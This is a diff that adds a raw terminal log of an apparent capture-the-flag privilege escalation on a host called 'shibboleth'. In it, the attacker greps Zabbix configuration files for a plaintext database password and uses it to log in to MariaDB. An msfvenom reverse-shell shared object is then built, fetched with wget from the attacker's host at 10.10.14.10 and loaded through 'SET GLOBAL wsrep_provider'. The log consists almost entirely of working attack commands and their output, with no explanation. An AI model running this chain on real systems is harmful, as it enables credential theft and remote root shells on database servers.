@@ -247,4 +247,117 @@ su ipmi-svc
 Password:
 
 
+id
+uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)
+ls -la
+total 72
+drwxr-xr-x  19 root root  4096 Oct 16 16:41 .
+drwxr-xr-x  19 root root  4096 Oct 16 16:41 ..
+lrwxrwxrwx   1 root root     7 Apr 24  2021 bin -> usr/bin
+drwxr-xr-x   4 root root  4096 Nov  8 11:05 boot
+drwxr-xr-x  17 root root  3860 Dec  5 04:19 dev
+drwxr-xr-x  96 root root  4096 Nov  8 11:02 etc
+drwxr-xr-x   3 root root  4096 Oct 16 12:24 home
+lrwxrwxrwx   1 root root     7 Apr 24  2021 lib -> usr/lib
+lrwxrwxrwx   1 root root     9 Apr 24  2021 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root     9 Apr 24  2021 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root    10 Apr 24  2021 libx32 -> usr/libx32
+drwx------   2 root root 16384 Apr 24  2021 lost+found
+drwxr-xr-x   3 root root  4096 Apr 24  2021 media
+drwxr-xr-x   2 root root  4096 Apr 27  2021 mnt
+drwxr-xr-x   2 root root  4096 Apr 27  2021 opt
+dr-xr-xr-x 430 root root     0 Dec  5 04:18 proc
+drwx------   5 root root  4096 Dec  5 04:20 root
+drwxr-xr-x  25 root root   800 Dec  5 04:19 run
+lrwxrwxrwx   1 root root     8 Apr 24  2021 sbin -> usr/sbin
+drwxr-xr-x   2 root root  4096 Oct 16 13:24 snap
+drwxr-xr-x   2 root root  4096 Jul 31  2020 srv
+dr-xr-xr-x  13 root root     0 Dec  5 04:18 sys
+drwxrwxrwt  13 root root  4096 Dec  5 06:09 tmp
+drwxr-xr-x  15 root root  4096 Apr 24  2021 usr
+drwxr-xr-x  15 root root  4096 Apr 24  2021 var
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ipmi-svc@shibboleth:/$ grep -iR 'password' /etc/zabbix/ 2>/dev/null
+grep -iR 'password' /etc/zabbix/ 2>/dev/null
+/etc/zabbix/zabbix_server.conf.dpkg-dist:### Option: DBPassword
+/etc/zabbix/zabbix_server.conf.dpkg-dist:#      Database password.
+/etc/zabbix/zabbix_server.conf.dpkg-dist:#      Comment this line if no password is used.
+/etc/zabbix/zabbix_server.conf.dpkg-dist:# DBPassword=
+/etc/zabbix/zabbix_server.conf:### Option: DBPassword
+/etc/zabbix/zabbix_server.conf:#        Database password.
+/etc/zabbix/zabbix_server.conf:#        Comment this line if no password is used.
+/etc/zabbix/zabbix_server.conf:DBPassword=bloooarskybluh
+
+
+
+
+
+
+ipmi-svc@shibboleth:/$ mysql -u zabbix -p -D zabbix
+mysql -u zabbix -p -D zabbix
+Enter password: bloooarskybluh
+
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 1222
+Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [zabbix]> SET GLOBAL wsrep_provider="/tmp/exploit.so";
+SET GLOBAL wsrep_provider="/tmp/exploit.so";
+ERROR 1231 (42000): Variable 'wsrep_provider' can't be set to the value of '/tmp/exploit.so'
+MariaDB [zabbix]> exit
+exit
+Bye
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=9002 -f elf-so -oexploit.so
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf-so file: 476 bytes
+Saved as: exploit.so
+
+
+
+
+
+ipmi-svc@shibboleth:/$ cd /tmp
+cd /tmp
+ipmi-svc@shibboleth:/tmp$ wget http://10.10.14.10:800/exploit.so
+wget http://10.10.14.10:800/exploit.so
+--2021-12-05 06:20:39--  http://10.10.14.10:800/exploit.so
+Connecting to 10.10.14.10:800... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 476 [application/octet-stream]
+Saving to: ‘exploit.so’
+
+exploit.so          100%[===================>]     476  --.-KB/s    in 0s      
+
+2021-12-05 06:20:39 (52.3 MB/s) - ‘exploit.so’ saved [476/476]
+
+ipmi-svc@shibboleth:/tmp$ mysql -u zabbix -p -D zabbix
+mysql -u zabbix -p -D zabbix
+Enter password: bloooarskybluh
+
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 1365
+Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [zabbix]> SET GLOBAL wsrep_provider="/tmp/exploit.so";
+SET GLOBAL wsrep_provider="/tmp/exploit.so";
+ERROR 2013 (HY000): Lost connection to MySQL server during query
+MariaDB [zabbix]>
 
